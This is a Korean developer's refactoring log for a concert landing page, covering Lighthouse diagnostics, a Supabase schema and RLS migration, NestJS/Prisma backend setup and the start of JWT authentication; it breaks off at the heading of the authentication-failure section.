# REFACTOR_NOTES.md

> SUMMIT 정기공연 랜딩 페이지 리팩토링 기록
> 작성 시작일: 2026-08-31
> 목적: 1학기 실사용자 피드백을 근거로 진단 → 원인 확인 → 개선까지의 과정을 기록. 아직 리팩토링 실행 전, "발견" 단계까지의 기록.

---

## 1. 배경

1학기 여름 정기공연(2026.06.25~26) 런칭 후 동아리원(실사용자)들로부터 다음 피드백을 받음:

- "로딩이 느리다"
- "카드/이미지 로딩이 오래 걸린다"
- "스크롤이 중간중간 끊긴다"

이 문서는 위 피드백의 원인을 실제 코드/수치로 진단한 기록이다. 아직 원인을 코드로 직접 확인하기 전이었기 때문에, 추측이 아니라 Lighthouse 진단 + 코드 직접 확인을 통해 근거를 먼저 확보하는 순서로 진행함.

---

## 2. Before 측정 결과 (2026-08-30, 리팩토링 착수 전 원본 상태)

측정 조건: Chrome DevTools Lighthouse, Mobile, Navigation 모드, 시크릿 모드(확장 프로그램 영향 배제)

| 페이지                                           | Performance 점수 | LCP           | FCP  | TBT   | Speed Index | CLS | Total Byte Weight |
| ------------------------------------------------ | ---------------- | ------------- | ---- | ----- | ----------- | --- | ----------------- |
| `/` (홈)                                         | 78               | **4.4s** 🔴   | 1.0s | 300ms | 1.5s        | 0   | 974 KiB           |
| `/setlist`                                       | 79               | **4.8s** 🔴   | 0.9s | 210ms | 2.1s        | 0   | 784 KiB           |
| `/event-goods` (실제로는 셋리스트 전체보기 화면) | 71               | **9.8s** 🔴🔴 | 0.9s | 180ms | 3.8s        | 0   | **2,387 KiB**     |

**관찰**: 이미지 개수가 늘어나는 페이지일수록 LCP가 뚜렷하게 악화됨 (홈 8개 → setlist 5개 → event-goods 18개 이미지 요청). LCP가 페이지 간 가장 뚜렷한 병목이며, CLS는 세 페이지 모두 0으로 측정됨 (→ 4번 참고).

---

## 3. 발견된 문제

### 3-1. `/event-goods` — 외부 CDN에서 앨범 커버 원본 해상도를 그대로 로드 (가장 심각)

Network 요청 분석 결과, 이 페이지의 무거운 이미지 18개는 `public` 폴더가 아니라 **Apple Music CDN(`mzstatic.com`)에서 직접 가져오는 앨범 커버**였음. 전부 `600x600bb.jpg` — 즉 600x600 원본 해상도 그대로 요청하고 있고, 개당 60~190KB, 18개 합쳐서 약 1.9MB.

실제 화면에서 이 이미지들은 목록의 작은 썸네일(가로 40~60px 추정)로만 쓰이는데, 그 몇 배 크기인 원본을 그대로 받아오고 있음 — **이 페이지 LCP 9.8초의 핵심 원인으로 확정.**

가장 큰 5개:

- cover_KM0020509_1.jpg — 189KB
- 8809851798683.jpg — 187KB
- 201_cover.jpg — 169KB
- cover_KM0000121_1.jpg — 136KB
- 8809936060797.jpg — 133KB

→ 해결 방향(가설): iTunes/Apple Music Search API 응답에서 더 작은 사이즈 파라미터(`100x100bb.jpg` 등)를 요청하거나, `next/image`로 프록시해서 리사이징.

### 3-2. `public` 폴더 이미지 — 최적화 없이 직접 서빙 (홈/setlist 공통)

`public/day1-teamN.png`, `public/day2-teamN.png` 등 팀 카드 이미지 14개, 각 85~94KB. `next/image`를 거치지 않고 원본 그대로 요청됨 (`https://summit-concert.live/day2-team8.png` 형태로 직접 요청 확인, `_next/image` 경로 아님).

참고로 `concert-poster-latest.png`는 `_next/image?url=...&w=750&q=75` 형태로 확인되어 **일부는 이미 next/image를 쓰고 있음** — 팀 카드 이미지 쪽만 빠져있는 것으로 추정.

전체 `public` 폴더 이미지 총합 3.6MB (ticket-back/front 각 500KB대, 타임테이블 이미지 2개 각 470KB대 포함).

### 3-3. CLS가 0으로 측정된 것에 대한 재해석

세 페이지 모두 CLS 0 — 처음엔 "스크롤 끊김과 무관한가?"로 오해할 수 있으나, **Lighthouse의 CLS는 페이지 로드 시점의 레이아웃 변화만 측정**하고 로드 후 사용자의 실제 스크롤 중 발생하는 버벅임(jank)은 잡지 못함. 따라서 "스크롤이 끊긴다"는 피드백의 원인은 CLS가 아니라 다른 곳(이미지 디코딩 비용, 혹은 framer-motion 애니메이션의 메인 스레드 점유)일 가능성이 높음.

→ **다음 진단 단계**: DevTools Performance 탭으로 실제 스크롤 동작을 녹화해 원인 특정 필요 (아직 미실행).

### 3-4. 홈페이지 JS 실행 비용

홈페이지 Diagnostics에서 확인:

- Main-thread work: 7.5s
- Long task: 5개
- Reduce unused JavaScript: 약 200KiB 절감 가능

이미지 문제와 별개로 JS 실행 비용도 상당함. 홈페이지에 여러 개 걸려있는 `FadeInUp` 애니메이션 컴포넌트(framer-motion)가 원인일 가능성.

### 3-5. `lib/src/lib/supabase.ts` 중복 파일

정상 위치는 `src/lib/supabase.ts`. `lib/src/lib/supabase.ts`는 불필요한 중복으로, GitHub 트리 직접 확인으로 재확인됨. 제거 대상.

### 3-6. `dist` 폴더가 레포에 커밋되어 있음

빌드 산출물(`dist/assets/*.js`, `*.css`, 이미지 중복본)이 버전관리 대상이 되어있음. `.gitignore` 설정 미흡으로 추정. 저장소 용량 증가 + 혼란 유발.

### 3-7. 라우트명과 실제 콘텐츠 불일치

`/event-goods` 경로인데 실제 렌더링되는 화면은 "셋리스트 전체 보기"(곡별 앨범 커버 포함 플레이리스트 뷰)임. 네비게이션 메뉴에도 연결되어 있지 않은 상태(직접 URL 접근으로만 확인 가능). 애초에 굿즈 판매 목적으로 만들다가 셋리스트 상세 뷰로 용도가 바뀐 것으로 추정. 추후 `/setlist/all` 등으로 리네이밍 필요.

### 3-8. Supabase Free Tier 자동 Pause (운영 이슈)

진단 도중 Supabase 프로젝트가 free tier 미사용 기간 초과로 자동 pause되어 사이트 데이터가 전부 안 불러와지는 상황 발생 (원인: 데이터 삭제 아님, resume으로 즉시 복구 확인됨). 12월 정기공연 전까지 재발 방지 필요 — GitHub Actions로 주기적 핑을 보내거나 Pro 플랜 전환 검토.

### 3-9. (기존 확인) 대형 클라이언트 컴포넌트

`setlist/page.tsx`(654줄), `event-goods/page.tsx`(539줄) — 정적 데이터, 데이터 페칭, UI가 분리 없이 한 파일에 혼재. 전체가 `"use client"`로 선언되어 있고 Supabase 페칭이 `useEffect` 내부에서 이뤄져 SSR 이점을 포기하고 있음. `location/page.tsx`, `site-footer.tsx`는 Server-to-Client 조합 패턴이 올바르게 적용되어 있어 참고 가능.

---

## 4. 정량 데이터 확보 상태

- **Before 지표 확보 완료** (2026-08-30, 위 표 참고, 원본 상태 그대로 측정 — 손대지 않음)
- Lighthouse HTML/JSON 리포트 3종 저장 완료 (`lighthouse-before-{home,setlist,event}-0831`)
- **After 지표**: 리팩토링 완료 후 동일 조건으로 재측정 예정
- **실사용자 트래픽 데이터**: 없음. `@vercel/analytics` 등 어떤 analytics도 설치된 이력 없음(Vercel Analytics "Get Started" 화면으로 확인). 1학기엔 데이터 수집 체계 자체가 없었음 — 12월 정기공연 전 Analytics 선반영 필요.

---

## 5. 다음 단계 (미실행, 계획만)

우선순위 순:

1. `/event-goods` 앨범 커버 이미지 리사이징 (가장 확실한 개선 근거, 임팩트 최대)
2. `public` 폴더 팀 카드 이미지 → `next/image` 전환
3. DevTools Performance 탭으로 실제 스크롤 녹화 → jank 원인 특정
4. `setlist/page.tsx`, `event-goods/page.tsx` 서버/클라이언트 컴포넌트 분리 (TypeScript/React 학습 진도에 맞춰 진행 예정)
5. `lib/src/lib/supabase.ts` 삭제, `dist` 폴더 `.gitignore` 처리
6. `@vercel/analytics` 설치
7. `/event-goods` 라우트 리네이밍

---

## 6. work01-4 (Server/Client 분할) 진행 기록

- 2026-09-13: `setlist/page.tsx` 리팩토링 중 트랙 매칭 방식을 `trackItemsByTeamKey`(정규화된 팀명 문자열 키)에서 `trackItemsByCardId`(Line Up row id 키)로 임의 변경했다가, lineUpRows가 비어있고 setlistRows만 있는 엣지 케이스에서 더미 카드가 실데이터와 매칭될 기회를 잃는 회귀를 발견 — 스코프(CLS 수정)를 벗어난 개선이었으므로 원안(`trackItemsByTeamKey`)으로 원복함.

## 7. 버그 수정 기록: Setlist 스키마 변경 이후 팀당 1곡만 노출되던 문제 (2026-09-19)

### 배경

프로덕션 Supabase `Setlist` 테이블 스키마를 다음과 같이 변경함:

- 제거: `team`(문자열, Line Up.team_name과 매칭하던 값), `day`, `image_src`
- 추가: `teamId`(int8, `Line Up.id`를 참조하는 FK)
- 유지: `id`, `title`, `singer`, `album`, `youtube_url`

변경 직후 `/setlist`, `/event-goods` 페이지에서 각 팀 아래 곡이 1곡씩만(혹은 팀-곡 매칭이 어긋나게) 노출되는 회귀가 발생. Network 탭 확인 결과 Supabase 요청은 전부 200 정상 응답 — 쿼리 문제가 아니라 응답 데이터를 팀별로 그룹핑하는 프론트엔드 로직 문제로 판단하고 코드를 직접 확인함.

### 원인

`src/app/setlist/page.tsx`, `src/app/event-goods/page.tsx`의 `getTeamFromSetlistRow`/`getTeamFromRow` 함수가 `Setlist` row에서 `row.team` → `row.team_name` 순으로 값을 찾고, 둘 다 없으면 **해당 Setlist row 자신의 id**를 기준으로 `getTeamFallbackName(id)`를 호출해 임의의 팀명을 반환하는 폴백 구조였음.

스키마 변경으로 `Setlist.team`/`team_name` 컬럼이 사라지면서 모든 Setlist row가 항상 폴백 경로를 타게 됐고, 그 결과 **Setlist row 고유 id마다 서로 다른 팀명이 붙어버려** 사실상 모든 곡이 서로 다른(대부분 존재하지 않는) "팀"으로 흩어지는 결과가 나왔음. 화면에는 이게 "팀당 곡 1개"처럼 보였는데, 실제로는 팀 매칭 자체가 완전히 깨져 있던 것.

기존에도 문자열 정규화(`normalizeTeamName`) 기반 매칭이라 오탈자/표기 차이에 취약한 구조였는데, 이번 스키마 변경으로 애초에 매칭에 쓰일 컬럼 자체가 사라지면서 문제가 드러남. `.claude`에는 관련 스코프 문서가 없어 별도 참고할 규칙은 없었고, 과거 §6 기록(2026-09-13, `trackItemsByCardId`로 바꿨다가 lineUpRows가 비어있는 엣지 케이스 때문에 원복한 이력)이 있었으나, 이번엔 애초에 DB 스키마 자체가 id 기반 매칭을 강제하므로 그 우려가 더 이상 적용되지 않음(팀 문자열 매칭 경로가 스키마 상 존재하지 않게 됨).

### 수정 내용

문자열 정규화 매칭을 전부 제거하고 `Setlist.teamId` ↔ `Line Up.id` 숫자 매칭으로 교체:

- `src/lib/fetch-line-up-and-setlist.ts`: `SetlistRow` 타입에서 `team`/`day`/`image_src` 제거, `teamId?: number` 추가 (Line Up 테이블은 스키마 변경 없어 `LineUpRow` 타입은 그대로 둠)
- `src/app/setlist/page.tsx`, `src/app/event-goods/page.tsx`: `normalizeTeamName` 기반 팀명 정규화/그룹핑 로직 제거. `tracksByTeam: Record<string, TrackItem[]>` → `tracksByTeamId: Record<number, TrackItem[]>`로 변경하고 `row.teamId`로 그룹핑. `Line Up.id` 집합과 대조해 존재하지 않는 teamId는 무시(데이터 정합성 방어는 기존과 동일하게 유지, 키만 문자열→숫자)
- `src/components/sections/setlist-view.tsx`: 모달에서 곡 목록을 찾을 때 `normalizeTeamName(selectedCard.title)` 문자열 매칭 대신 `selectedCard.id`(Line Up row id)로 직접 조회하도록 변경. `normalizeTeamName` 함수 자체 삭제
- 카드/포스터/팀명 표시는 `Line Up` 테이블 기준이라 스키마 영향 없음 — `card-carousel.tsx`, `getTeamFromRow`(카드용) 등은 수정하지 않음

### 검증 결과 (2026-09-19, 로컬 프로덕션 데이터 기준)

Supabase에 직접 SQL로 확인한 팀별 곡 수와 실제 화면 노출 곡 수를 대조:

| teamId | Line Up 팀명 | DB상 곡 수 | 화면 노출 곡 수 |
| ------ | ------------- | ---------- | ---------------- |
| 1      | 8C8           | 4          | 4 (일치)         |
| 3      | 즐겜굴비      | 4          | 4 (일치)         |
| 4      | 써밋 음악도둑 | 6          | 6 (일치)         |

`/setlist`에서 8C8·즐겜굴비 카드를 각각 클릭해 모달에 뜨는 곡 목록이 DB의 `teamId` 그룹과 정확히 일치함을 확인(Playwright로 직접 클릭 후 스냅샷 대조). `/event-goods`에서도 1일차 전체 7개 팀의 곡 목록이 각 팀 아래 올바르게 묶여 렌더링됨을 확인(써밋 음악도둑 6곡 포함).

### 스코프 밖에서 발견했지만 손대지 않은 것 (참고용 기록)

- Supabase RLS(Row Level Security)가 `Line Up`, `Setlist` 테이블 모두 비활성화 상태 — anon key로 읽기/쓰기가 전부 열려 있음. 이번 버그 수정과 무관하여 별도 처리하지 않았고, 정책 설계 없이 RLS만 켜면 전체 접근이 막히므로 신중한 별도 작업 필요.
- `getTeamFallbackName`/`getImageFallbackPath`(Line Up 카드용 폴백)는 이번 수정 대상이 아니라 그대로 유지됨 — Line Up 테이블에 `team_name`이 비어있는 극단적 케이스에서만 동작하는 방어 코드.

## 8. DB 스키마 마이그레이션(FK 전환) + RLS 활성화 (2026-09-19)

### 배경

work02(Nest.js 백엔드 + 어드민 페이지) 착수를 앞두고, 어드민 페이지에서 팀명을 직접 수정할 수 있는 기능을 넣을 계획을 확정함. 이 상태에서 §7에서 다룬 `Setlist.team`(문자열) ↔ `Line Up.team_name`(문자열) 매칭 구조를 그대로 두면, 어드민이 팀명을 수정하는 순간 두 테이블의 연결이 깨지는 문제가 재발할 것이 자명했음. 또한 §7 말미 "스코프 밖에서 발견했지만 손대지 않은 것"에 기록해둔 RLS 비활성화 문제도 이번에 함께 해소함.

### 문제

1. `Setlist.team` 문자열 매칭 방식은 오탈자/표기 차이에 취약하고, §7에서 실제로 스키마 변경 한 번만으로 팀-곡 매칭이 전부 깨지는 회귀가 발생한 전례가 있음. 어드민의 팀명 수정 기능과 근본적으로 상충하는 구조
2. `Line Up`에 공연 순서를 나타내는 컬럼이 없어, 어드민의 팀 재정렬 기능을 구현할 방법이 없음
3. `Setlist`, `Line Up` 두 테이블 모두 RLS(Row Level Security)가 disabled 상태 — anon key로 읽기뿐 아니라 쓰기까지 가능한 보안 취약점 (§7에서 발견했으나 "정책 설계 없이 RLS만 켜면 전체 접근이 막히므로 신중한 별도 작업 필요"로 보류했던 항목)

### 변경 내용 (Supabase, production)

- **Setlist**: `team`(문자열), `day`, `image_src` 컬럼 제거. `teamId`(int8, FK → `Line Up.id`) 컬럼 추가
- **Line Up**: `performanceOrder` 컬럼 추가 (기존 컬럼 구조는 유지)
- **RLS**: `Setlist`, `Line Up` 두 테이블에 SELECT 전용 정책(`public` role, `using(true)`) 추가 후 RLS 활성화 → anon key는 이제 읽기만 가능, 쓰기는 불가능한 상태

최종 컬럼 구조(요약):

| 테이블   | 컬럼                                                              |
| -------- | ------------------------------------------------------------------- |
| Line Up  | `id`, `team_name`, `day`, `image_src`, `performanceOrder`(신규)     |
| Setlist  | `id`, `title`, `singer`, `album`, `youtube_url`, `teamId`(신규, FK → Line Up.id) |

### 검증

- 프론트엔드는 §7 수정으로 이미 `teamId` 기반 매칭(`tracksByTeamId`)으로 전환이 끝난 상태였기 때문에, 이번 컬럼 정리(`team`/`day`/`image_src` 제거)는 추가 코드 변경 없이 그대로 반영됨
- RLS 활성화 후 `/setlist`, `/event-goods`가 anon key로 정상적으로 데이터를 읽어오는지 확인. anon key로는 쓰기(insert/update/delete)가 거부되는 것을 확인
- `performanceOrder`는 이번 마이그레이션에서 컬럼만 추가한 상태로, 프론트엔드/백엔드 어디에서도 아직 사용하지 않음 — work02의 팀 재정렬 기능 구현 시점에 실제로 소비될 예정

## 9. work02-1 — Nest.js 프로젝트 세팅 + Supabase Postgres 직접 연결 (2026-09-19)

### 배경

§8에서 스키마 정규화(FK 전환)와 RLS 활성화가 끝나 work02 착수 조건이 충족됨. 이번 단계의 목표는 CRUD 구현이 아니라, **Nest.js가 Supabase PostgREST(anon key)를 거치지 않고 Postgres에 Prisma로 직접 붙는 상태를 만들고 연결을 검증하는 것**까지다. 빌드 순서 1단계(`.claude/rules/work-02-nest.js.md`)에 해당.

### 저장소 구조 판단 — web 이동은 보류

`apps/web` + `apps/api` 모노레포가 최종 목표지만, 이번에는 **`apps/api`만 신규 생성하고 Next.js는 루트에 그대로 뒀다.**

- `.vercel/repo.json`의 프로젝트 `directory`가 `"."` — web을 옮기면 Vercel 대시보드의 Root Directory 설정을 동시에 바꿔야 하고, 그 전까지 `summit-concert.live` 프로덕션 배포가 깨진다. 백엔드 세팅과 배포 설정 변경을 한 커밋에 섞을 이유가 없음
- web 이동은 경로 참조(tsconfig paths, 문서, Lighthouse 산출물)를 광범위하게 건드려 Nest 스캐폴딩과 diff가 뒤섞임

`apps/api` 경로는 web 이동 후에도 바뀌지 않으므로, 지금 확정해도 나중에 재작업이 없다. web 이동은 별도 작업으로 분리.

### 작업 내용

**1) NestJS 스캐폴딩** — `apps/api`, Nest 12 (ESM, TypeScript 6, vitest, oxlint). 기본 포트는 Next.js 개발 서버(3000)와 충돌하지 않도록 **3001**. 보일러플레이트 `AppController`/`AppService`와 그에 딸린 스펙은 제거하고 `HealthController`로 대체.

**2) Prisma 7.10.0** — `prisma` 패키지의 npm `latest` 태그가 `8.0.0-rc.15`(RC)를 가리키고 있어, 안정 버전인 7.10.0으로 명시 고정했다. Prisma 7부터 접속 URL은 `schema.prisma`의 `datasource` 블록이 아니라 `prisma.config.ts`에서 관리하고, 클라이언트는 driver adapter(`@prisma/adapter-pg`) 기반으로 동작한다.

**3) 연결 방식** — Supabase **Session pooler(포트 5432)** 사용.

| 후보 | 채택 여부 | 이유 |
| ---- | --------- | ---- |
| Direct connection (`db.<ref>.supabase.co:5432`) | ✗ | Free tier는 IPv6 전용이라 환경에 따라 접속 불가 |
| Transaction pooler (`:6543`) | ✗ | 서버리스용. Nest는 상주 프로세스라 세션 단위 연결이 적합하고, prepared statement 제약을 받을 이유가 없음 |
| **Session pooler (`:5432`)** | ✓ | IPv4 지원, 상주 서버에 적합, 마이그레이션도 동작 |

접속 계정은 `postgres`. `pg_roles` 확인 결과 `rolbypassrls = true`이고 두 테이블의 소유자이므로, §8에서 건 SELECT 전용 RLS 정책과 무관하게 관리자 쓰기가 가능하다 — 별도 service role 계정을 따로 만들 필요가 없었음.

**4) `db pull` 및 스키마 정리** — 기존 2개 테이블 introspect 성공. DB의 이름 규칙이 뒤섞여 있어(`Line Up` 테이블명에 공백, `team_name`/`image_src`는 snake_case, `teamId`/`performanceOrder`는 camelCase), **Prisma 쪽 이름은 PRD 데이터 모델 기준 camelCase로 통일하고 차이는 `@map`/`@@map`으로만 흡수**했다. `int8` → `BigInt`, `int2` → `Int @db.SmallInt`로 정확히 반영된 것도 확인.

| Prisma 모델/필드 | 실제 DB |
| ---------------- | ------- |
| `LineUp` | `@@map("Line Up")` |
| `LineUp.teamName` | `@map("team_name")` |
| `LineUp.cardImageUrl` | `@map("image_src")` |
| `Setlist.albumCoverUrl` | `@map("album")` |
| `Setlist.youtubeUrl` | `@map("youtube_url")` |

리네이밍이 DB에 영향을 주지 않는다는 것은 `prisma migrate diff --from-config-datasource --to-schema`가 *empty migration*을 반환하는 것으로 확인했다.

**5) 마이그레이션 이력 baseline** — 기존 테이블은 Prisma 이력에 없으므로, `0_init` 마이그레이션을 생성만 하고 `prisma migrate resolve --applied 0_init`으로 "이미 적용됨" 처리했다(SQL은 실행되지 않음). 이 과정을 생략하면 이후 마이그레이션이 기존 테이블을 재생성하려 든다.

**6) AdminUser 테이블 신규 생성** — PRD 데이터 모델 기준(`id` int8, `username`, `passwordHash`). PRD에 없지만 추가한 것은 `username` UNIQUE(로그인 조회 정합성)와 RLS 활성화.

`prisma migrate dev`가 아니라 **`prisma migrate deploy`를 사용**했다. `migrate dev`는 드리프트를 감지하면 DB 리셋(전체 DROP)을 제안하는 경로가 있어 프로덕션 DB에 쓸 수 없고, `deploy`에는 그 경로가 없다. 적용 SQL은 사전에 `migrate diff`로 전량 확인한 뒤 실행.

**7) 신규 테이블의 RLS** — `pg_default_acl` 확인 결과, `postgres`가 `public` 스키마에 만드는 테이블은 **`anon`/`authenticated`에게 ALL 권한(`arwdDxtm`)이 기본 부여**된다. 즉 RLS 없이 `AdminUser`를 만들면 anon key만으로 PostgREST를 통해 비밀번호 해시를 읽고 쓸 수 있다. 정책 없이 RLS만 활성화해 anon 경로를 전면 차단했다(`postgres`는 `rolbypassrls`라 영향 없음).

같은 이유로 Prisma가 자동 생성하는 `_prisma_migrations`도 노출 대상이 되어 Supabase 보안 린터가 ERROR(`rls_disabled_in_public`)를 냈다. 이미 적용된 마이그레이션 파일을 수정하면 체크섬이 깨지므로 별도 마이그레이션(`20260919120500_secure_prisma_migrations_table`)으로 분리했다.

이 마이그레이션은 한 차례 미적용 상태로 남았다가 이후 `migrate deploy`로 반영 완료됨 — 경위는 아래 "작업 중 발생한 이슈" 1번 참조.

### 검증

- `prisma db pull` → 기존 2개 모델 introspect 성공, 컬럼 타입/케이스 정확히 반영
- `migrate diff` → 리네이밍 후 드리프트 0 (empty migration)
- `GET /health` 응답: `{"status":"ok","database":"connected","rowCounts":{"lineUp":15,"setlist":64,"adminUser":0}}` — Prisma Client가 실제로 세 테이블을 조회함을 확인
- 마이그레이션 후 기존 데이터 무영향 확인: `Line Up` 15행, `Setlist` 64행, `teamId`가 채워진 곡 64/64행 (마이그레이션 전과 동일)
- 루트 `npm run build`(Next.js 프로덕션 빌드) / `npm run lint` 정상 통과 — 백엔드 추가가 기존 프론트엔드에 영향 없음

최종 상태(3개 마이그레이션 전부 반영 + DB 비밀번호 재설정 이후 재확인):

- `_prisma_migrations` 3행 모두 정상. `0_init`은 `applied_steps_count = 0`(baseline이라 SQL 미실행), 나머지 둘은 `1`(실제 실행됨)
- 4개 테이블 전부 `relrowsecurity = true`. `Line Up`/`Setlist`는 SELECT 정책 1개, `AdminUser`/`_prisma_migrations`는 정책 0개(= anon 전면 차단)
- Supabase 보안 린터 ERROR 0건. 남은 2건은 의도한 INFO(`rls_enabled_no_policy`)
- 새 비밀번호로 `GET /health` 재확인 → 동일 응답, 서버 로그 에러 없음

### 기존 프론트엔드에 가한 변경 (백엔드 추가의 부수 효과)

`apps/api` 추가만으로 기존 빌드가 깨지는 지점이 있어 함께 수정했다.

- **`tsconfig.json`**: `exclude`에 `apps` 추가. 루트 tsconfig의 `include`가 `["**/*.ts", ...]`이고 `exclude`가 `["node_modules"]`뿐이라, 그대로 두면 `next build` 타입체크가 Nest 코드를 끌어간다
- **`eslint.config.mjs`**: `globalIgnores`에 `apps/**` 추가 (백엔드는 자체 린터 oxlint 사용)
- **`.gitignore`**: `.env*` 패턴이 `.env.example`까지 무시하고 있어 `!.env.example` 예외 추가. 또한 루트의 `/node_modules`는 선행 슬래시 때문에 루트에만 적용되므로, `apps/api/.gitignore`를 따로 두어 `node_modules`/`dist`/`.env`/생성 클라이언트를 처리

### 이 단계에서 의도적으로 하지 않은 것

- **CRUD 로직 전부** — 1단계 스코프는 연결 검증까지
- **`Setlist.youtubeReviewStatus` 컬럼** — PRD에 "신규 컬럼 추가 필요"로 명시돼 있으나 빌드 순서 4단계(Song CRUD)에서 다룸
- **`apps/web` 이동** — 위 "저장소 구조 판단" 참조
- **BigInt 직렬화 처리** — `id`가 `int8`이라 Prisma는 `BigInt`로 매핑하는데, `JSON.stringify`가 `BigInt`에서 예외를 던진다. `/health`는 `count()`(number)만 반환해 문제가 없지만, 실제 레코드를 응답에 싣는 3단계(Team CRUD) 시작 시점에 직렬화 방식을 먼저 정해야 함
  - **→ 확정됨 (2026-09-19, §11)**: 전역 인터셉터·프로토타입 패치가 아니라 **응답 매퍼 + 응답 타입 선언**(`toTeamResponse` / `TeamResponse`). 근거와 기각한 대안은 §11 "기술 판단" 참조. 4단계 `Setlist`(`id`, `teamId` 둘 다 int8)도 같은 패턴을 재사용한다

### 작업 중 발생한 이슈 2건

**1) `_prisma_migrations` 보안 마이그레이션이 한 차례 미적용으로 남음**

`20260919120500_secure_prisma_migrations_table`을 만든 직후 `migrate deploy` 호출이 거부되면서 파일만 커밋되고 DB에는 반영되지 않은 상태로 한 턴을 넘겼다.

주의할 점은 **거부 주체가 Postgres가 아니라 개발 도구 쪽 권한 정책이었다**는 것이다. DB는 에러를 낸 적이 없다. 당시 기록을 "권한 정책에 걸려 차단됨"이라고만 남겨서, 이후 이걸 *`postgres` role의 DB 권한 부족* 문제로 오진하고 "Supabase 대시보드 SQL Editor에서 수동 실행 → `migrate resolve --applied`로 히스토리만 맞추기" 우회 경로를 검토하는 일이 있었다. 실제로는 그럴 필요가 없었다:

- 해당 마이그레이션은 `ALTER TABLE "_prisma_migrations" ENABLE ROW LEVEL SECURITY;` 한 줄이고, Supabase 관리 role(anon/authenticated/service_role)에 대한 GRANT/REVOKE가 없다
- `_prisma_migrations`의 소유자가 `postgres`(= 접속 계정 본인)이고, 테이블 소유자는 자기 테이블에 RLS를 켤 수 있다. Session pooler 연결과도 무관

결국 `migrate deploy`를 그대로 재실행해 반영됐다(`applied_steps_count = 1`로 실제 실행 확인). **교훈 두 가지**: (a) 실행 실패를 기록할 때 *무엇이* 거부했는지를 명시해야 한다 — 도구 정책 거부와 DB 권한 오류는 대응이 완전히 다르다. (b) `migrate resolve --applied`는 SQL 실행 여부를 검증하지 않고 "적용됨"으로 기록만 하므로, 수동 실행 단계를 빠뜨리면 마이그레이션 히스토리가 조용히 거짓이 된다 — 우회 경로로 쉽게 손대면 안 되는 명령이다.

**2) DB 비밀번호 노출 → 재설정**

`.env.example`에 실제 connection string(비밀번호 포함)이 들어간 상태가 잠시 존재했다. 이 파일은 **커밋 대상**이고 레포는 Public이라 그대로 뒀으면 자격증명이 공개됐을 상황이었다.

- 커밋 전에 값을 비웠고, git 이력에는 들어가지 않은 것을 확인함 (`git show :apps/api/.env.example` → 빈 값)
- 다만 노출 경로가 완전히 통제되지 않아 Supabase 대시보드에서 **DB 비밀번호를 재설정**하고 `apps/api/.env`만 갱신함. 재설정 후 `migrate deploy`/`GET /health` 모두 정상 동작 확인

부수적으로, 대시보드가 보여주는 `[YOUR-PASSWORD]`의 **대괄호가 placeholder 표기**인데 이를 포함한 채로 붙여넣으면 URL 파싱이 깨진다(실제로 한 번 발생). `.env.example` 주석에 이 두 가지(실제 값 금지, 대괄호 제거)를 명시해 뒀다.

### 완료 상태 및 다음 단계

- **완료 커밋**: `9809748` (`feature/nestjs-backend-setup`). 이후 PR #31로 `develop`에 머지됨(`1765e43`) — 위 문장은 작성 시점 기준이었고, 머지는 §10 착수 직전에 확인함
- **다음**: work02 빌드 순서 2단계 — Auth 모듈(JWT 로그인, PRD F001/F002). `.claude/rules/git-rules.md`에 따라 `feature/auth-*` 브랜치로 격리해 작업하고, `develop` 머지 전 별도 검증 단계를 거친다
- 이번 단계에서 만든 `AdminUser` 테이블이 Auth 모듈의 첫 소비처가 된다 (현재 0행 — 계정 시딩 방식은 2단계에서 결정)

## 10. work02-2 — Auth 모듈: JWT 로그인 + 접근 제어 (2026-09-19)

### 배경

work02 빌드 순서 2단계, PRD `F001`(관리자 로그인)/`F002`(접근 제어). §9에서 만든 `AdminUser` 테이블(0행)의 첫 소비처다.

목표는 "**AdminUser 계정으로 로그인하면 JWT가 발급되고, 그 JWT 없이는 관리자 라우트에 접근할 수 없는 상태**"까지. 3~6단계에서 붙일 팀/곡/유튜브 API가 이 Guard를 그대로 재사용하는 것이 전제라, 이 단계에서 만드는 것은 엔드포인트 2개가 아니라 **이후 모든 관리자 라우트가 올라탈 인증 기반**이다.

브랜치는 `.claude/rules/git-rules.md`의 "인증/세션 작업은 `feature/auth-*`로 격리" 규칙에 따라 `feature/auth-jwt-login`.

### 작업 내용

**1) 비밀번호 해싱 — Argon2id (`auth/password.service.ts`)**

`PasswordService`가 해싱/검증을 전부 감싼다. 파라미터는 OWASP Password Storage Cheat Sheet 권장값(m=19MiB, t=2, p=1)을 **코드에 명시적으로 고정**했다. 라이브러리 기본값과 현재는 같지만, 버전이 올라가며 기본값이 바뀌면 해싱 비용이 조용히 달라지기 때문이다.

**2) 초기 관리자 계정 시딩 (`scripts/seed-admin.ts`, `scripts/terminal-prompt.ts`)**

`npm run seed:admin` — 아이디/비밀번호를 **실행 시점에 터미널에서 직접 입력**받는다. 이미 있는 아이디를 입력하면 비밀번호 재설정으로 동작한다(MVP에 비밀번호 변경 UI가 없으므로 분실/교체 시 유일한 경로).

`AppModule` 대신 `ConfigModule + PrismaModule + PasswordService`만 묶은 축소 모듈로 컨텍스트를 띄운다. `AppModule`을 쓰면 `JWT_SECRET`까지 설정돼 있어야 스크립트가 돌기 때문에, "계정 먼저 만들고 JWT 설정은 나중에" 순서를 막을 이유가 없다.

**3) JWT 발급 (`auth/auth.service.ts`, `auth/auth.module.ts`)**

`POST /auth/login` → 200 + `{ accessToken }`. 자원을 만드는 게 아니라 토큰을 발급할 뿐이므로 201이 아니라 200으로 고정했다.

페이로드는 `sub`(= `AdminUser.id`) **하나뿐**이다. `username`을 넣지 않은 이유는 (a) 토큰은 브라우저 저장소·로그에 남기 쉬운 값이라 최소한만 담고, (b) 나중에 계정 정보 수정이 생겼을 때 토큰 안의 값이 DB와 어긋난 채 살아있는 상황을 만들지 않기 위해서다. 대신 `GET /auth/me`가 매번 DB를 한 번 읽는다.

`JWT_SECRET`은 `.env` 전용이며 **기본값을 두지 않았다** — 없거나 32자 미만이면 기동 자체가 실패한다. 개발 편의용 기본 시크릿을 두면 그대로 배포될 위험이 있다. `JWT_EXPIRES_IN`은 형식을 기동 시점에 정규식으로 검사한다(jsonwebtoken은 잘못된 형식을 첫 서명 시점에야 알려줘서, 오타가 첫 로그인까지 숨는다).

**4) 인증 실패 처리**

